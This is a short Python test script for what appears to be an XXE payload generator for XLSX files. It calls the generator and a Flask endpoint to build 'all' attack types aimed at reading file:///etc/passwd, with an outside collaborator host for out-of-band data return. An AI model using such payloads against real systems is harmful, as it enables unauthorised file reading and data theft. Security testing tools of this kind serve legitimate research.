#!/usr/bin/env python
import sys
sys.path.insert(0, 'd:\\Project\\xxe-xlsx-tool\\xxe-xlsx-tool\\backend')

try:
    from xxe_generator import XXEGenerator
    
    gen = XXEGenerator()
    
    # Test payload generation directly
    payloads = gen.generate_payloads(
        target_url='file:///etc/passwd',
        collaborator='http://test.com',
        attack_type='all'
    )
    
    print('Generated payloads:')
    print(f'Count: {len(payloads)}')
    for i, p in enumerate(payloads, 1):
        print(f'{i}. {p["name"]} ({p["type"]})')
        if len(p["payload"]) > 80:
            print(f'   Payload: {p["payload"][:80]}...')
        else:
            print(f'   Payload: {p["payload"]}')
        print()
    
    # Now test the Flask endpoint
    print('\n=== Testing Flask app ===')
    import os
    os.environ['FLASK_ENV'] = 'production'
    from app import app
    
    with app.test_client() as client:
        response = client.post('/api/generate-payloads', 
            json={
                'target_url': 'file:///etc/passwd',
                'collaborator': 'http://test.com',
                'attack_type': 'all'
            }
        )
        
        print(f'Status: {response.status_code}')
        print(f'Response: {response.get_json()}')
    
except Exception as e:
    import traceback
    print('Error:')
    traceback.print_exc()
